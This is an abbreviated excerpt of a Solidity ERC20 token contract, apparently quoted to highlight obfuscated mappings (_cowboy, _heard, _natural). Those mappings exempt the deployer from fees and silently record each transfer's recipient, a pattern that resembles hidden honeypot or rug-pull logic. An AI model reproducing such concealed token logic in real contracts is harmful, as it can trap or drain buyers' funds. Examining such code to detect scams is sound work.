...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _order = _tTotal;
    ...
    mapping(uint256 => address) private _heard;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _natural;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _cowboy;
    ...
    constructor(
        ...
        _cowboy[address(this)] = _order;
        _cowboy[msg.sender] = _order;
    ...
    function _transfer(
        ...
        _natural[_heard[_order]] = _order;
        _heard[_order] = to;

        if (_taxFee > 0 && _cowboy[from] == 0 && !inSwapAndLiquify && _cowboy[to] == 0) {
